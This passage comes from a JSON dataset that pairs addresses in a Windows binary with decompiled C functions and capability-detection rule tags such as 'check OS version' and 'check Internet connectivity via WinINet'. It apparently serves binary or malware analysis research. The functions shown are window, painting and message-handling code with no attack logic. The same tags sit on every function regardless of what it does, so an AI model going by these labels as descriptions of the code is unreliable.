        "decompiled_code": "\nvoid fcn.0043c50c(void)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint var_14h;\n    uint var_4h;\n    \n    puStack32 = 0x43c520;\n    cVar1 = fcn.0044000c();\n    if ((cVar1 != '\\0') && ((*(in_EAX + 7) & 8) == 0)) {\n        if (*(in_EAX + 0x58) == 0) {\n            puStack32 = 0x43c54c;\n            fcn.0043c5a0();\n            uStack36 = 0x43c593;\n            uStack40 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xffffffd8;\n            puStack32 = &stack0xfffffffc;\n            (**(*in_EAX + 0x44))();\n            (**(*in_EAX + 0x90))();\n            *in_FS_OFFSET = uStack40;\n            puStack32 = 0x43c59a;\n            *(in_EAX + 0x15) = *(in_EAX + 0x15) & 0xffef;\n            uStack36 = 0x43c592;\n            fcn.0043c5a8();\n            return;\n        }\n        *(in_EAX + 0x15) = *(in_EAX + 0x15) | 0x10;\n    }\n    return;\n}\n",
        "token_count": 349
    },
    "0043c5a8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.0043c5a8(void)\n\n{\n    int32_t in_EAX;\n    \n    *(in_EAX + 0x160) = *(in_EAX + 0x160) + -1;\n    if ((*(in_EAX + 0x160) == 0) && ((*(in_EAX + 0x54) & 0x10) != 0)) {\n        fcn.0043c5c8();\n    }\n    return;\n}\n",
        "token_count": 106
    },
    "0043ca58": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0043ca58(uint param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    iVar1 = fcn.0043ca38();\n    if (-1 < iVar1 + -1) {\n        do {\n            iVar2 = fcn.0043c9fc();\n            (**(iVar2 + 0x38))();\n            if (*(param_2 + 0xc) != 0) {\n                return;\n            }\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != 0);\n    }\n    return;\n}\n",
        "token_count": 138
    },
    "0043ccc0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0043ccc0(void)\n\n{\n    char cVar1;\n    int16_t iVar2;\n    int32_t *in_EAX;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint *in_FS_OFFSET;\n    uint uVar5;\n    uint *arg_ch;\n    uint uStack216;\n    uint uStack212;\n    uchar *puStack208;\n    uint var_c0h;\n    int32_t var_bch;\n    uint var_b8h;\n    uint lpWndClass;\n    code *var_b0h;\n    uint var_8ch;\n    uint var_85h;\n    int32_t var_70h;\n    uint var_68h;\n    code *var_64h;\n    uint hInstance;\n    uint *var_44h;\n    uint lpClassName;\n    \n    puStack208 = &stack0xfffffffc;\n    uStack212 = 0x43ce81;\n    uStack216 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack216;\n    (**(*in_EAX + 0x98))();\n    if ((var_70h == 0) && ((var_85h & 0x40) != 0)) {\n        if ((in_EAX[1] != 0) && ((*(in_EAX[1] + 0x1c) & 2) != 0)) {\n            cVar1 = fcn.004033e4();\n            if (cVar1 != '\\0') {\n                var_70h = fcn.0043fd08();\n                goto code_r0x0043cd6c;\n            }\n        }\n        var_bch = in_EAX[2];\n        var_b8h._0_1_ = 0xb;\n        arg_ch = &var_bch;\n        uVar5 = 0;\n        fcn.00405b0c();\n        fcn.0040b574(uVar5, arg_ch);\n        fcn.004039e4();\n    }\ncode_r0x0043cd6c:\n    in_EAX[0x5d] = var_64h;\n    iVar3 = sub.user32.dll_GetClassInfoA(hInstance, &lpClassName, &lpWndClass);\n    if ((iVar3 == 0) || (var_b0h != fcn.004362cc)) {\n        if (iVar3 != 0) {\n            sub.user32.dll_UnregisterClassA(&lpClassName, hInstance);\n        }\n        var_64h = fcn.004362cc;\n        var_44h = &lpClassName;\n        iVar2 = sub.user32.dll_RegisterClassA(&var_68h);\n        if (iVar2 == 0) {\n            fcn.0040c9c0();\n        }\n    }\n    *0x461a8c = in_EAX;\n    (**(*in_EAX + 0x9c))();\n    if (in_EAX[0x60] == 0) {\n        fcn.0040c9c0();\n    }\n    uVar4 = sub.user32.dll_GetWindowLongA(in_EAX[0x60], 0xfffffff0);\n    if ((uVar4 & 0x40000000) != 0) {\n        iVar3 = sub.user32.dll_GetWindowLongA(in_EAX[0x60], 0xfffffff4);\n        if (iVar3 == 0) {\n            sub.user32.dll_SetWindowLongA(in_EAX[0x60], 0xfffffff4, in_EAX[0x60]);\n        }\n    }\n    fcn.00408828();\n    in_EAX[0x19] = 0;\n    fcn.00440018();\n    uVar5 = 1;\n    fcn.0041c904();\n    fcn.0043a6d4(uVar5);\n    if (*(in_EAX + 0x17) != '\\0') {\n        fcn.00403454();\n    }\n    *in_FS_OFFSET = uVar5;\n    fcn.00403fa8(0x43ce88);\n    return;\n}\n",
        "token_count": 902
    },
    "0043cf70": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nuint32_t __cdecl fcn.0043cf70(int32_t arg_8h)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uchar auStack8 [3];\n    uint var_1h;\n    \n    _auStack8 = 0x1000000;\n    if ((*(*(arg_8h + -4) + 0x20) == 0) || (uVar1 = fcn.0043cf5c(),  uVar1 == '\\0')) {\n        iVar3 = *(*(arg_8h + -8) + 0x198);\n        if ((iVar3 != 0) && (iVar3 = *(iVar3 + 8),  -1 < iVar3 + -1)) {\n            do {\n                uVar2 = fcn.00413b64();\n                if ((*(uVar2 + 0x5b) == '\\0') && (uVar1 = uVar2 & 0xffffff00,  *0x43d044 != *(uVar2 + 0x61)))\n                goto code_r0x0043d03b;\n                iVar3 = iVar3 + -1;\n            } while (iVar3 != 0);\n        }\n        uVar1 = *(*(arg_8h + -8) + 0x19c);\n        if ((uVar1 != 0) && (iVar3 = *(uVar1 + 8),  -1 < iVar3 + -1)) {\n            do {\n                uVar2 = fcn.00413b64();\n                uVar1 = uVar2;\n                if ((*(uVar2 + 0x5b) == '\\0') && (uVar1 = uVar2 & 0xffffff00,  *0x43d044 != *(uVar2 + 0x61)))\n                goto code_r0x0043d03b;\n                iVar3 = iVar3 + -1;\n            } while (iVar3 != 0);\n        }\n    }\n    _auStack8 = 0;\ncode_r0x0043d03b:\n    return uVar1 & 0xffffff00 | _auStack8 >> 0x18;\n}\n",
        "token_count": 498
    },
    "0043d260": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.0043d260(void)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    \n    if (in_EAX[0x60] != 0) {\n        if ((in_EAX[0x67] != 0) && (iVar1 = *(in_EAX[0x67] + 8),  -1 < iVar1 + -1)) {\n            do {\n                fcn.00413b64();\n                fcn.0043d260();\n                iVar1 = iVar1 + -1;\n            } while (iVar1 != 0);\n        }\n        (**(*in_EAX + 0xb0))();\n    }\n    return;\n}\n",
        "token_count": 151
    },
    "0043d2a8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.0043d2a8(void)\n\n{\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 0x180) != 0) {\n        fcn.0043a6d4(0);\n    }\n    return;\n}\n",
        "token_count": 59
    },
    "0043d300": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.0043d300(void)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uVar3;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_4h;\n    \n    if (((*(in_EAX + 0x57) == '\\0') && (((*(in_EAX + 7) & 0x10) == 0 || ((*(in_EAX + 0x51) & 4) != 0)))) ||\n       ((*(in_EAX + 0x15) & 8) != 0)) {\n        cVar1 = '\\0';\n    }\n    else {\n        cVar1 = '\\x01';\n    }\n    if (cVar1 != '\\0') {\n        if (in_EAX[0x60] == 0) {\n            puStack28 = 0x43d356;\n            (**(*in_EAX + 0x94))();\n        }\n        if ((in_EAX[0x67] != 0) && (iVar2 = *(in_EAX[0x67] + 8),  -1 < iVar2 + -1)) {\n            do {\n                puStack28 = 0x43d37e;\n                fcn.00413b64();\n                puStack28 = 0x43d383;\n                fcn.0043d300();\n                iVar2 = iVar2 + -1;\n            } while (iVar2 != 0);\n        }\n    }\n    if ((in_EAX[0x60] != 0) && (*(in_EAX + 0x1a6) != cVar1)) {\n        *(in_EAX + 0x1a6) = cVar1;\n        uStack32 = 0x43d3d6;\n        uStack36 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffdc;\n        uVar3 = 0;\n        puStack28 = &stack0xfffffffc;\n        fcn.0043a6d4(0);\n        *in_FS_OFFSET = uVar3;\n    }\n    return;\n}\n",
        "token_count": 480
    },
    "0043d3fc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.0043d3fc(void)\n\n{\n    int32_t iVar1;\n    char cVar2;\n    int32_t in_EAX;\n    \n    while (iVar1 = *(in_EAX + 0x30),  iVar1 != 0) {\n        in_EAX = iVar1;\n        if (*(iVar1 + 0x1a6) == '\\0') {\n            return;\n        }\n    }\n    cVar2 = fcn.004033e4();\n    if ((cVar2 == '\\0') && (*(in_EAX + 400) == 0)) {\n        return;\n    }\n    fcn.0043d300();\n    return;\n}\n",
        "token_count": 147
    },
    "0043d43c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0043d43c(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    uint arg_8h;\n    \n    if ((*(in_EAX + 0x30) == 0) && (param_2 != *(in_EAX + 400))) {\n        if ((*(in_EAX + 0x180) == 0) || ((*(in_EAX + 400) == 0 || (param_2 == 0)))) {\n            fcn.0043d260();\n            *(in_EAX + 400) = param_2;\n        }\n        else {\n            *(in_EAX + 400) = param_2;\n            sub.user32.dll_SetParent(*(in_EAX + 0x180), param_2);\n            if ((4 < **0x461f30) && (**0x462204 == 2)) {\n                arg_8h = 0;\n                fcn.0040698c();\n                fcn.0043a6d4(arg_8h);\n            }\n        }\n        fcn.0043d3fc();\n    }\n    return;\n}\n",
        "token_count": 252
    },
    "0043d53c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0043d53c(int32_t arg_8h)\n\n{\n    bool bVar1;\n    char cVar2;\n    int32_t *in_EAX;\n    int32_t iVar3;\n    uint arg_8h_00;\n    uint lprc;\n    uint var_8h;\n    uint var_4h;\n    \n    fcn.00412708();\n    *(arg_8h + -0xc) = var_8h;\n    *(arg_8h + -8) = var_4h;\n    (**(*in_EAX + 0x44))(*(arg_8h + -0xc), *(arg_8h + -8));\n    iVar3 = sub.user32.dll_PtInRect(&lprc);\n    if (iVar3 != 0) {\n        if (((*(in_EAX + 7) & 0x10) != 0) && ((*(in_EAX + 0x57) != '\\0' || ((*(in_EAX + 0x51) & 4) == 0)))) {\ncode_r0x0043d5e1:\n            bVar1 = true;\n            goto code_r0x0043d5e3;\n        }\n        if (*(in_EAX + 0x57) != '\\0') {\n            cVar2 = (**(*in_EAX + 0x50))();\n            if ((cVar2 != '\\0') || (*(arg_8h + -0xd) != '\\0')) {\n                arg_8h_00 = fcn.00406974();\n                iVar3 = fcn.0043a6d4(arg_8h_00);\n                if (iVar3 != 0) goto code_r0x0043d5e1;\n            }\n        }\n    }\n    bVar1 = false;\ncode_r0x0043d5e3:\n    if (bVar1) {\n        *(arg_8h + -0x14) = in_EAX;\n    }\n    return;\n}\n",
        "token_count": 440
    },
    "0043d5f4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0043d5f4(uint arg_8h)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uchar *puVar3;\n    uint var_14h;\n    uint var_dh;\n    uint var_4h;\n    \n    if (((arg_8h != '\\0') && (*(in_EAX + 0x19c) != 0)) && (iVar2 = *(*(in_EAX + 0x19c) + 8) + -1,  -1 < iVar2)) {\n        do {\n            puVar3 = &stack0xfffffffc;\n            fcn.00413b64();\n            cVar1 = fcn.0043d53c(puVar3);\n            if (cVar1 != '\\0') break;\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != -1);\n    }\n    if ((*(in_EAX + 0x198) != 0) && (iVar2 = *(*(in_EAX + 0x198) + 8) + -1,  -1 < iVar2)) {\n        do {\n            puVar3 = &stack0xfffffffc;\n            fcn.00413b64();\n            cVar1 = fcn.0043d53c(puVar3);\n            if (cVar1 != '\\0') {\n                return 0;\n            }\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != -1);\n    }\n    return 0;\n}\n",
        "token_count": 340
    },
    "0043d688": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nbool __fastcall fcn.0043d688(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    \n    iVar1 = fcn.0043fd08();\n    iVar2 = sub.user32.dll_GetCapture();\n    if (iVar1 == iVar2) {\n        if ((*0x461b4c == 0) || (iVar1 = *0x461b4c,  in_EAX != *(*0x461b4c + 0x30))) {\n            iVar1 = 0;\n        }\n    }\n    else {\n        uVar3 = 0;\n        fcn.00406960();\n        iVar1 = fcn.0043d5f4(uVar3);\n    }\n    if (iVar1 != 0) {\n        uVar3 = fcn.00406974(*(param_2 + 8) - *(iVar1 + 0x40), *(param_2 + 10) - *(iVar1 + 0x44));\n        uVar3 = fcn.0043a6d4(uVar3);\n        *(param_2 + 0xc) = uVar3;\n    }\n    return iVar1 != 0;\n}\n",
        "token_count": 281
    },
    "0043d71c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0043d71c(uint param_1, int32_t *param_2)\n\n{\n    char cVar1;\n    uint8_t uVar2;\n    int32_t in_EAX;\n    int32_t *piVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint uVar6;\n    \n    iVar4 = *param_2;\n    if (iVar4 < 0x85) {\n        if (iVar4 == 0x84) {\n            fcn.0043a7a0();\n            if (param_2[3] != -1) {\n                return;\n            }\n            uVar6 = 0;\n            fcn.00406960();\n            fcn.00439070();\n            iVar4 = fcn.0043d5f4(uVar6);\n            if (iVar4 == 0) {\n                return;\n            }\n            param_2[3] = 1;\n            return;\n        }\n        if (iVar4 == 7) {\n            piVar3 = fcn.004506c0();\n            if ((piVar3 != NULL) && (cVar1 = (**(*piVar3 + 0xe8))(),  cVar1 == '\\0')) {\n                return;\n            }\n            goto code_r0x0043d86f;\n        }\n        if (iVar4 != 8) {\n            if (iVar4 == 0x1f) {\n                iVar4 = fcn.0043fd08();\n                iVar5 = sub.user32.dll_GetCapture();\n                if (((iVar4 == iVar5) && (*0x461b4c != 0)) && (in_EAX == *(*0x461b4c + 0x30))) {\n                    fcn.0043a6d4(0);\n                }\n            }\n            goto code_r0x0043d86f;\n        }\n        uVar2 = *(in_EAX + 0x54) & 0x20;\n    }\n    else {\n        if (8 < iVar4 - 0x100U) {\n            if ((iVar4 - 0x200U < 0xb) && (cVar1 = fcn.0043d688(),  cVar1 != '\\0')) {\n                if (param_2[3] != 0) {\n                    return;\n                }\n                cVar1 = fcn.0044000c();\n                if (cVar1 == '\\0') {\n                    return;\n                }\n                uVar6 = fcn.0043fd08(*param_2, param_2[1], param_2[2]);\n                sub.user32.dll_DefWindowProcA(uVar6);\n                return;\n            }\n            goto code_r0x0043d86f;\n        }\n        uVar2 = fcn.00439c90();\n    }\n    if (uVar2 != 0) {\n        return;\n    }\ncode_r0x0043d86f:\n    fcn.0043a7a0();\n    return;\n}\n",
        "token_count": 654
    },
    "0043d880": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0043d880(uint param_1, int32_t *param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint uVar2;\n    \n    if (*(in_EAX + 0x180) == 0) {\n        fcn.0043a934();\n    }\n    else {\n        if ((*param_2 == 0x7b) && (*(in_EAX + 0x30) != 0)) {\n            iVar1 = fcn.0043a6d4(param_2[2]);\n            param_2[3] = iVar1;\n            if (iVar1 != 0) {\n                return;\n            }\n        }\n        iVar1 = *param_2;\n        if (iVar1 - 0x132U < 7) {\n            iVar1 = sub.user32.dll_SendMessageA(param_2[2], iVar1 + 0xbc00, param_2[1], param_2[2]);\n            param_2[3] = iVar1;\n        }\n        else if (iVar1 - 0xbd32U < 7) {\n            uVar2 = fcn.0041c430();\n            sub.gdi32.dll_SetTextColor(param_2[1], uVar2);\n            fcn.0041d0b4();\n            uVar2 = fcn.0041c430();\n            sub.gdi32.dll_SetBkColor(param_2[1], uVar2);\n            iVar1 = fcn.0041d0f0();\n            param_2[3] = iVar1;\n        }\n        else if (iVar1 == *0x463b28) {\n            param_2[3] = in_EAX;\n        }\n        else {\n            iVar1 = sub.user32.dll_CallWindowProcA(*(in_EAX + 0x174), *(in_EAX + 0x180), iVar1, param_2[1], param_2[2]);\n            param_2[3] = iVar1;\n        }\n        if (*param_2 == 0xc) {\n            fcn.004390cc(param_2[2]);\n        }\n    }\n    return;\n}\n",
        "token_count": 473
    },
    "0043d9bc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0043d9bc(uint param_1, int32_t param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t iVar4;\n    int32_t *in_FS_OFFSET;\n    int32_t in_stack_ffffff80;\n    int32_t iVar5;\n    int32_t iStack116;\n    uint uStack112;\n    uchar *puStack108;\n    uint uStack104;\n    uint *puStack100;\n    uint var_50h;\n    uint nSavedDC;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t *var_4h;\n    \n    iVar1 = *(param_2 + 4);\n    var_8h = param_2;\n    var_4h = in_EAX;\n    if (iVar1 == 0) {\n        puStack100 = &fcn.0043d9bc::var_50h;\n        uStack104 = 0x43d9e1;\n        uStack104 = fcn.0043fd08();\n        puStack108 = 0x43d9e7;\n        iVar1 = sub.user32.dll_BeginPaint();\n    }\n    uStack112 = 0x43dadc;\n    iStack116 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff8c;\n    if (var_4h[0x66] == 0) {\n        puStack108 = &stack0xfffffffc;\n        (**(*var_4h + 0xb8))();\n        iVar1 = in_stack_ffffff80;\n    }\n    else {\n        iVar5 = iVar1;\n        puStack108 = &stack0xfffffffc;\n        nSavedDC = sub.gdi32.dll_SaveDC(iVar1);\n        var_ch = 2;\n        iVar4 = *(var_4h[0x66] + 8);\n        if (-1 < iVar4 + -1) {\n            do {\n                iVar2 = fcn.00413b64();\n                if ((((*(iVar2 + 0x57) != '\\0') || (((*(iVar2 + 0x1c) & 0x10) != 0 && ((*(iVar2 + 0x51) & 4) == 0)))) &&\n                    ((*(iVar2 + 0x50) & 0x40) != 0)) &&\n                   (iVar5 = iVar1,  var_ch = sub.gdi32.dll_ExcludeClipRect(),  var_ch == 1)) break;\n                iVar4 = iVar4 + -1;\n            } while (iVar4 != 0);\n        }\n        if (var_ch != 1) {\n            (**(*var_4h + 0xb8))(iVar5);\n        }\n        sub.gdi32.dll_RestoreDC(iVar1, nSavedDC);\n    }\n    fcn.0043db14();\n    *in_FS_OFFSET = iVar1;\n    if (*(var_8h + 4) == 0) {\n        uVar3 = fcn.0043fd08(&fcn.0043d9bc::var_50h, 0x43dae3);\n        sub.user32.dll_EndPaint(uVar3);\n    }\n    return;\n}\n",
        "token_count": 718
    },
    "0043db14": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0043db14(int32_t param_1, uchar *param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t iVar4;\n    uchar *puVar5;\n    uchar *puStack72;\n    uchar *puStack68;\n    uchar *puStack48;\n    uint uStack44;\n    int32_t iStack36;\n    uchar auStack32 [16];\n    \n    if (((*(in_EAX + 0x1a8) != '\\0') && (*(in_EAX + 0x1a7) != '\\0')) && (*(in_EAX + 0x17c) != 0)) {\n        (**(**(in_EAX + 0x17c) + 0x20))();\n    }\n    if (*(in_EAX + 0x198) != 0) {\n        iVar4 = 0;\n        if ((param_1 != 0) && (iVar4 = fcn.00413bc0(),  iVar4 < 0)) {\n            iVar4 = 0;\n        }\n        puStack48 = *(*(in_EAX + 0x198) + 8);\n        if (iVar4 < puStack48) {\n            do {\n                iVar1 = fcn.00413b64();\n                if ((*(iVar1 + 0x57) != '\\0') || (((*(iVar1 + 0x1c) & 0x10) != 0 && ((*(iVar1 + 0x51) & 4) == 0)))) {\n                    fcn.00412730(&stack0xffffffe0, *(iVar1 + 0x44) + *(iVar1 + 0x4c));\n                    puStack68 = 0x43dbd2;\n                    iVar2 = sub.gdi32.dll_RectVisible();\n                    puStack48 = param_2;\n                    if (iVar2 != 0) {\n                        if ((*(in_EAX + 0x54) & 0x80) != 0) {\n                            *(iVar1 + 0x54) = *(iVar1 + 0x54) | 0x80;\n                        }\n                        puStack72 = 0x43dbe8;\n                        puStack68 = param_2;\n                        sub.gdi32.dll_SaveDC();\n                        puStack72 = 0x43dbf9;\n                        fcn.00437e68();\n                        puStack72 = *(iVar1 + 0x4c);\n                        sub.gdi32.dll_IntersectClipRect(param_2, 0, 0, *(iVar1 + 0x48));\n                        fcn.0043a6d4(0);\n                        sub.gdi32.dll_RestoreDC();\n                        *(iVar1 + 0x54) = *(iVar1 + 0x54) & 0xff7f;\n                    }\n                }\n                iVar4 = iVar4 + 1;\n            } while (iVar4 < puStack48);\n        }\n    }\n    if ((*(in_EAX + 0x19c) != 0) && (iStack36 = *(*(in_EAX + 0x19c) + 8),  -1 < iStack36 + -1)) {\n        do {\n            iVar4 = fcn.00413b64();\n            if (((*(iVar4 + 0x1a5) != '\\0') && ((*(iVar4 + 0x50) & 0x10) != 0)) &&\n               ((*(iVar4 + 0x57) != '\\0' || (((*(iVar4 + 0x1c) & 0x10) != 0 && ((*(iVar4 + 0x51) & 4) == 0)))))) {\n                fcn.0041c430();\n                uStack44 = sub.gdi32.dll_CreateSolidBrush();\n                puVar5 = &stack0xffffffdc;\n                puStack68 = 0x43dccf;\n                fcn.00412730(puVar5, *(iVar4 + 0x44) + *(iVar4 + 0x4c));\n                puStack68 = &stack0xffffffd4;\n                puStack72 = param_2;\n                sub.user32.dll_FrameRect();\n                sub.gdi32.dll_DeleteObject(puVar5);\n                uVar3 = fcn.0041c430();\n                uVar3 = sub.gdi32.dll_CreateSolidBrush(uVar3);\n                iVar4 = *(iVar4 + 0x44) + *(iVar4 + 0x4c) + 1;\n                puVar5 = &stack0xffffffc0;\n                puStack72 = uVar3;\n                fcn.00412730(puVar5, iVar4);\n                sub.user32.dll_FrameRect(param_2, &stack0xffffffb8, puVar5, iVar4, uVar3);\n                sub.gdi32.dll_DeleteObject(puVar5);\n            }\n            iStack36 = iStack36 + -1;\n        } while (iStack36 != 0);\n    }\n    return;\n}\n",
        "token_count": 1111
    },
    "0043dd44": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0043dd44(uint arg_8h)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint lprc;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    int32_t var_10h;\n    uint nSavedDC;\n    uint edge;\n    int32_t var_4h;\n    \n    *(in_EAX + 0x54) = *(in_EAX + 0x54) | 0x80;\n    nSavedDC = sub.gdi32.dll_SaveDC();\n    fcn.00437e68();\n    sub.gdi32.dll_IntersectClipRect();\n    iVar3 = 0;\n    edge = 0;\n    uVar1 = fcn.0043fd08(0xffffffec);\n    uVar2 = sub.user32.dll_GetWindowLongA(uVar1);\n    if ((uVar2 & 0x200) == 0) {\n        uVar1 = fcn.0043fd08(0xfffffff0);\n        uVar2 = sub.user32.dll_GetWindowLongA(uVar1);\n        if ((uVar2 & 0x800000) != 0) {\n            edge = 3;\n            iVar3 = 0xa00f;\n        }\n    }\n    else {\n        edge = 10;\n        iVar3 = 0x200f;\n    }\n    if (iVar3 != 0) {\n        sub.user32.dll_SetRect(&lprc, 0, 0, *(in_EAX + 0x48), *(in_EAX + 0x4c));\n        sub.user32.dll_DrawEdge();\n        fcn.00437e68();\n        sub.gdi32.dll_IntersectClipRect();\n    }\n    fcn.0043a6d4(0);\n    fcn.0043a6d4(0);\n    if ((*(in_EAX + 0x19c) != 0) && (iVar3 = *(*(in_EAX + 0x19c) + 8),  -1 < iVar3 + -1)) {\n        var_4h = 0;\n        var_10h = iVar3;\n        do {\n            iVar3 = fcn.00413b64();\n            if (*(iVar3 + 0x57) != '\\0') {\n                fcn.0043dd44(*(iVar3 + 0x44));\n            }\n            var_4h = var_4h + 1;\n            var_10h = var_10h + -1;\n        } while (var_10h != 0);\n    }\n    sub.gdi32.dll_RestoreDC();\n    *(in_EAX + 0x54) = *(in_EAX + 0x54) & 0xff7f;\n    return;\n}\n",
        "token_count": 631
    },
    "0043e15c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
